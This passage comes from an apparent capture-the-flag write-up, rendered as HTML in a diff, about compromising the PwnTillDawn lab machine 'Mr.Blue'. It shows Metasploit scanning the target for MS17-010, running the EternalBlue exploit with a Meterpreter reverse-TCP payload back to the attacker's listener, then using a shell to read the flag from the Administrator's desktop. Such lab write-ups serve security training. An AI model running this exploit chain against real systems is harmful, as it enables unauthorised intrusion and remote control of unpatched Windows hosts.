+</span></span><span class="line"><span class="cl">                rdlists/named_pipes.txt
+</span></span><span class="line"><span class="cl">   RHOSTS                                                yes       The target host<span class="o">(</span>s<span class="o">)</span>, see https://github.com/rapid7/metasploit-framework
+</span></span><span class="line"><span class="cl">                                                                   /wiki/Using-Metasploit
+</span></span><span class="line"><span class="cl">   RPORT        <span class="m">445</span>                                      yes       The SMB service port <span class="o">(</span>TCP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   SMBDomain    .                                        no        The Windows domain to use <span class="k">for</span> authentication
+</span></span><span class="line"><span class="cl">   SMBPass                                               no        The password <span class="k">for</span> the specified username
+</span></span><span class="line"><span class="cl">   SMBUser                                               no        The username to authenticate as
+</span></span><span class="line"><span class="cl">   THREADS      <span class="m">1</span>                                        yes       The number of concurrent threads <span class="o">(</span>max one per host<span class="o">)</span>
+</span></span><span class="line"><span class="cl">View the full module info with the info, or info -d command.
+</span></span><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS 10.150.150.242
+</span></span><span class="line"><span class="cl"><span class="nv">RHOSTS</span> <span class="o">=</span>&gt; 10.150.150.242
+</span></span><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> &gt; run
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Okay, The machine is Vulnerable to <strong>EternalBlue</strong> vulnerability.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 10.150.150.242:445    - Host is likely VULNERABLE to MS17-010! - Windows Server <span class="m">2008</span> R2 Enterprise <span class="m">7601</span> Service Pack <span class="m">1</span> x64 <span class="o">(</span>64-bit<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.150.150.242:445    - Scanned <span class="m">1</span> of <span class="m">1</span> hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Auxiliary module execution completed
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now, Let&rsquo;s head to the Exploitation phase to get our way through the machine and retrieve the flag!</p>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="eternalblue-exploit-metasploit">EternalBlue Exploit (Metasploit)</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> &gt; use exploit/windows/smb/ms17_010_eternalblue
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> &gt; options
+</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>exploit/windows/smb/ms17_010_eternalblue<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name           Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----           ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   RHOSTS                          yes       The target host<span class="o">(</span>s<span class="o">)</span>, see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+</span></span><span class="line"><span class="cl">   RPORT          <span class="m">445</span>              yes       The target port <span class="o">(</span>TCP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   SMBDomain                       no        <span class="o">(</span>Optional<span class="o">)</span> The Windows domain to use <span class="k">for</span> authentication. Only affects Windows Server <span class="m">2008</span> R2
+</span></span><span class="line"><span class="cl">                                             , Windows 7, Windows Embedded Standard <span class="m">7</span> target machines.
+</span></span><span class="line"><span class="cl">   SMBPass                         no        <span class="o">(</span>Optional<span class="o">)</span> The password <span class="k">for</span> the specified username
+</span></span><span class="line"><span class="cl">   SMBUser                         no        <span class="o">(</span>Optional<span class="o">)</span> The username to authenticate as
+</span></span><span class="line"><span class="cl">   VERIFY_ARCH    <span class="nb">true</span>             yes       Check <span class="k">if</span> remote architecture matches exploit Target. Only affects Windows Server <span class="m">2008</span> R2, Wi
+</span></span><span class="line"><span class="cl">                                             ndows 7, Windows Embedded Standard <span class="m">7</span> target machines.
+</span></span><span class="line"><span class="cl">   VERIFY_TARGET  <span class="nb">true</span>             yes       Check <span class="k">if</span> remote OS matches exploit Target. Only affects Windows Server <span class="m">2008</span> R2, Windows 7, W
+</span></span><span class="line"><span class="cl">                                             indows Embedded Standard <span class="m">7</span> target machines.
+</span></span><span class="line"><span class="cl">Payload options <span class="o">(</span>windows/x64/meterpreter/reverse_tcp<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">   Name      Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----      ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   EXITFUNC  thread           yes       Exit technique <span class="o">(</span>Accepted: <span class="s1">&#39;&#39;</span>, seh, thread, process, none<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   LHOST     192.168.152.128  yes       The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   LPORT     <span class="m">4444</span>             yes       The listen port
+</span></span><span class="line"><span class="cl">Exploit target:
+</span></span><span class="line"><span class="cl">   Id  Name
+</span></span><span class="line"><span class="cl">   --  ----
+</span></span><span class="line"><span class="cl">   <span class="m">0</span>   Automatic Target
+</span></span><span class="line"><span class="cl">View the full module info with the info, or info -d command.
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS 10.150.150.242
+</span></span><span class="line"><span class="cl"><span class="nv">RHOSTS</span> <span class="o">=</span>&gt; 10.150.150.242
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> &gt; <span class="nb">set</span> LHOST 10.66.X.X
+</span></span><span class="line"><span class="cl"><span class="nv">LHOST</span> <span class="o">=</span>&gt; 10.66.66.154
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> &gt; run
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Boom! We have got the Reverse Shell to the victim&rsquo;s machine!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.66.X.X:4444 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.150.150.242:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 10.150.150.242:445    - Host is likely VULNERABLE to MS17-010! - Windows Server <span class="m">2008</span> R2 Enterprise <span class="m">7601</span> Service Pack <span class="m">1</span> x64 <span class="o">(</span>64-bit<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.150.150.242:445    - Scanned <span class="m">1</span> of <span class="m">1</span> hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 10.150.150.242:445 - The target is vulnerable.        
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.150.150.242:445 - Triggering free of corrupted buffer.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">200774</span> bytes<span class="o">)</span> to 10.150.150.242
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>10.66.X.X:4444 -&gt; 10.150.150.242:51221<span class="o">)</span> at 2022-12-05 23:57:04 -0500
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 10.150.150.242:445 - <span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 10.150.150.242:445 - <span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-WIN-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 10.150.150.242:445 - <span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s switch up to the <strong>CMD shell</strong> interface and find our flag!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">meterpreter</span> <span class="p">&gt;</span> <span class="n">shell</span>
+</span></span><span class="line"><span class="cl"><span class="k">Process</span> <span class="n">1096</span> <span class="n">created</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Channel</span> <span class="n">1</span> <span class="n">created</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Microsoft</span> <span class="n">Windows</span> <span class="no">[Version 6.1.7601]</span>
+</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="n">2009</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="p">.</span>  <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="nb">dir
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="nb">cd </span><span class="p">../../</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd </span><span class="p">../../</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\&gt;</span><span class="nb">cd </span><span class="n">Users</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd </span><span class="n">Users</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">&gt;</span><span class="nb">dir
+</span></span></span><span class="line"><span class="cl"><span class="nb">dir
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span> <span class="n">Volume</span> <span class="k">in</span> <span class="n">drive</span> <span class="n">C</span> <span class="n">has</span> <span class="n">no</span> <span class="n">label</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Volume</span> <span class="n">Serial</span> <span class="n">Number</span> <span class="n">is</span> <span class="nb">F80A-FDD9</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Directory</span> <span class="n">of</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span>
+</span></span><span class="line"><span class="cl"><span class="n">05</span><span class="p">/</span><span class="n">23</span><span class="p">/</span><span class="n">2019</span>  <span class="n">08</span><span class="err">:</span><span class="n">33</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">05</span><span class="p">/</span><span class="n">23</span><span class="p">/</span><span class="n">2019</span>  <span class="n">08</span><span class="err">:</span><span class="n">33</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="p">..</span>
+</span></span><span class="line"><span class="cl"><span class="n">05</span><span class="p">/</span><span class="n">23</span><span class="p">/</span><span class="n">2019</span>  <span class="n">08</span><span class="err">:</span><span class="n">14</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Administrator</span><span class="p">.</span><span class="nb">GNBUSCA-W054</span>
+</span></span><span class="line"><span class="cl"><span class="n">06</span><span class="p">/</span><span class="n">27</span><span class="p">/</span><span class="n">2016</span>  <span class="n">09</span><span class="err">:</span><span class="n">05</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Classic</span> <span class="p">.</span><span class="n">NET</span> <span class="n">AppPool</span>
+</span></span><span class="line"><span class="cl"><span class="n">06</span><span class="p">/</span><span class="n">27</span><span class="p">/</span><span class="n">2016</span>  <span class="n">08</span><span class="err">:</span><span class="n">58</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">MSSQL</span><span class="nv">$SQLEXPRESS</span>
+</span></span><span class="line"><span class="cl"><span class="n">07</span><span class="p">/</span><span class="n">14</span><span class="p">/</span><span class="n">2009</span>  <span class="n">04</span><span class="err">:</span><span class="n">57</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Public</span>
+</span></span><span class="line"><span class="cl">               <span class="n">0</span> <span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>              <span class="n">0</span> <span class="n">bytes</span>
+</span></span><span class="line"><span class="cl">               <span class="n">6</span> <span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>  <span class="n">23</span><span class="p">,</span><span class="n">359</span><span class="p">,</span><span class="n">315</span><span class="p">,</span><span class="n">968</span> <span class="n">bytes</span> <span class="n">free</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">&gt;</span><span class="nb">cd </span><span class="n">Administrator</span><span class="p">.</span><span class="nb">GNBUSCA-W054</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd </span><span class="n">Administrator</span><span class="p">.</span><span class="nb">GNBUSCA-W054</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">.</span><span class="nb">GNBUSCA-W054</span><span class="p">&gt;</span><span class="nb">dir
+</span></span></span><span class="line"><span class="cl"><span class="nb">dir
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span> <span class="n">Volume</span> <span class="k">in</span> <span class="n">drive</span> <span class="n">C</span> <span class="n">has</span> <span class="n">no</span> <span class="n">label</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Volume</span> <span class="n">Serial</span> <span class="n">Number</span> <span class="n">is</span> <span class="nb">F80A-FDD9</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Directory</span> <span class="n">of</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">.</span><span class="nb">GNBUSCA-W054</span>
+</span></span><span class="line"><span class="cl"><span class="n">05</span><span class="p">/</span><span class="n">23</span><span class="p">/</span><span class="n">2019</span>  <span class="n">08</span><span class="err">:</span><span class="n">14</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">05</span><span class="p">/</span><span class="n">23</span><span class="p">/</span><span class="n">2019</span>  <span class="n">08</span><span class="err">:</span><span class="n">14</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="p">..</span>
+</span></span><span class="line"><span class="cl"><span class="n">05</span><span class="p">/</span><span class="n">23</span><span class="p">/</span><span class="n">2019</span>  <span class="n">08</span><span class="err">:</span><span class="n">14</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Contacts</span>
+</span></span><span class="line"><span class="cl"><span class="n">05</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2019</span>  <span class="n">03</span><span class="err">:</span><span class="n">18</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Desktop</span>
+</span></span><span class="line"><span class="cl"><span class="n">05</span><span class="p">/</span><span class="n">23</span><span class="p">/</span><span class="n">2019</span>  <span class="n">08</span><span class="err">:</span><span class="n">14</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Documents</span>
+</span></span><span class="line"><span class="cl"><span class="n">01</span><span class="p">/</span><span class="n">17</span><span class="p">/</span><span class="n">2020</span>  <span class="n">06</span><span class="err">:</span><span class="n">30</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Downloads</span>
+</span></span><span class="line"><span class="cl"><span class="n">05</span><span class="p">/</span><span class="n">23</span><span class="p">/</span><span class="n">2019</span>  <span class="n">08</span><span class="err">:</span><span class="n">14</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Favorites</span>
+</span></span><span class="line"><span class="cl"><span class="n">05</span><span class="p">/</span><span class="n">23</span><span class="p">/</span><span class="n">2019</span>  <span class="n">08</span><span class="err">:</span><span class="n">14</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Links</span>
+</span></span><span class="line"><span class="cl"><span class="n">05</span><span class="p">/</span><span class="n">23</span><span class="p">/</span><span class="n">2019</span>  <span class="n">08</span><span class="err">:</span><span class="n">14</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Music</span>
+</span></span><span class="line"><span class="cl"><span class="n">05</span><span class="p">/</span><span class="n">23</span><span class="p">/</span><span class="n">2019</span>  <span class="n">08</span><span class="err">:</span><span class="n">14</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Pictures</span>
+</span></span><span class="line"><span class="cl"><span class="n">05</span><span class="p">/</span><span class="n">23</span><span class="p">/</span><span class="n">2019</span>  <span class="n">08</span><span class="err">:</span><span class="n">14</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Saved</span> <span class="n">Games</span>
+</span></span><span class="line"><span class="cl"><span class="n">05</span><span class="p">/</span><span class="n">23</span><span class="p">/</span><span class="n">2019</span>  <span class="n">08</span><span class="err">:</span><span class="n">14</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Searches</span>
+</span></span><span class="line"><span class="cl"><span class="n">05</span><span class="p">/</span><span class="n">23</span><span class="p">/</span><span class="n">2019</span>  <span class="n">08</span><span class="err">:</span><span class="n">14</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Videos</span>
+</span></span><span class="line"><span class="cl">               <span class="n">0</span> <span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>              <span class="n">0</span> <span class="n">bytes</span>
+</span></span><span class="line"><span class="cl">              <span class="n">13</span> <span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>  <span class="n">23</span><span class="p">,</span><span class="n">359</span><span class="p">,</span><span class="n">315</span><span class="p">,</span><span class="n">968</span> <span class="n">bytes</span> <span class="n">free</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">.</span><span class="nb">GNBUSCA-W054</span><span class="p">&gt;</span><span class="nb">cd </span><span class="n">Desktop</span>             
+</span></span><span class="line"><span class="cl"><span class="nb">cd </span><span class="n">Desktop</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">.</span><span class="nb">GNBUSCA-W054</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span><span class="nb">dir
+</span></span></span><span class="line"><span class="cl"><span class="nb">dir
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span> <span class="n">Volume</span> <span class="k">in</span> <span class="n">drive</span> <span class="n">C</span> <span class="n">has</span> <span class="n">no</span> <span class="n">label</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Volume</span> <span class="n">Serial</span> <span class="n">Number</span> <span class="n">is</span> <span class="nb">F80A-FDD9</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Directory</span> <span class="n">of</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">.</span><span class="nb">GNBUSCA-W054</span><span class="p">\</span><span class="n">Desktop</span>
+</span></span><span class="line"><span class="cl"><span class="n">05</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2019</span>  <span class="n">03</span><span class="err">:</span><span class="n">18</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">05</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2019</span>  <span class="n">03</span><span class="err">:</span><span class="n">18</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="p">..</span>
+</span></span><span class="line"><span class="cl"><span class="n">05</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2019</span>  <span class="n">03</span><span class="err">:</span><span class="n">19</span> <span class="n">PM</span>                <span class="n">40</span> <span class="n">FLAG34</span><span class="p">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl">               <span class="n">1</span> <span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>             <span class="n">40</span> <span class="n">bytes</span>
+</span></span><span class="line"><span class="cl">               <span class="n">2</span> <span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>  <span class="n">23</span><span class="p">,</span><span class="n">359</span><span class="p">,</span><span class="n">315</span><span class="p">,</span><span class="n">968</span> <span class="n">bytes</span> <span class="n">free</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">.</span><span class="nb">GNBUSCA-W054</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span><span class="nb">type </span><span class="n">FLAG34</span><span class="p">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="nb">type </span><span class="n">FLAG34</span><span class="p">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="n">c2e9e102e55d5697ed2f9aXXXXXXXXXXXXXXXXX</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">.</span><span class="nb">GNBUSCA-W054</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><em>Pwned</em></p>
+<p><img src="/post/Mr.Blue_PwnTillDawn/imgs/2.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="pwned"
+	
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/pwntilldawn/">PwnTillDawn</a>
+        
+            <a href="/tags/pentesting/">PenTesting</a>
+        
+            <a href="/tags/web/">Web</a>
+        
+            <a href="/tags/exploit/">Exploit</a>
+        
+            <a href="/tags/vulnerability/">Vulnerability</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/django-pwntilldawn-writeup/">
+        
+        
+            <div class="article-image">
+                
